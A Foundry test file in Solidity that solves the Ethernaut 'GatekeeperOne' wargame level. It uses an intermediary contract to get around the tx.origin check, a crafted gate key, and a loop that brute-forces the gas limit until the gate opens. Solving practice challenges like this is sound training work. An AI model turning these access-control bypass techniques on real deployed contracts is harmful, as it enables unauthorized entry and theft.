// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/GatekeeperOne.sol";

contract MiddleMan {
    function enter(address gatekeeperOne, bytes8 gateKey, uint256 gasLimit) public {
        GatekeeperOne(gatekeeperOne).enter{gas: gasLimit}(gateKey);
    }
}

contract GatekeeperOneTest is Test {
    GatekeeperOne gatekeeperOne = GatekeeperOne(vm.envAddress("GATEKEEPER_ONE"));

    function test() public {
        assertEq(gatekeeperOne.entrant(), address(0));

        bytes8 gateKey = bytes8(uint64(2 ** 33 + 21124));
        // uint32 gateKeyPartOne = uint32(uint64(gateKey));
        // uint16 gateKeyPartTwo = uint16(uint64(gateKey));
        // uint64 gateKeyPartThree = uint64(gateKey);
        // uint16 gateKeyPartFour = uint16(uint160(tx.origin));

        MiddleMan middleMan = MiddleMan(vm.envAddress("GATEKEEPER_ONE_MIDDLEMAN"));
        for (uint256 i = 0; i < 1000; i++) {
            try middleMan.enter(address(gatekeeperOne), gateKey, 81910 + i) {
                if (gatekeeperOne.entrant() == tx.origin) {
                    console.log("i", i);
                    break;
                }
            } catch {}
        }

        assertEq(gatekeeperOne.entrant(), tx.origin);
    }
}
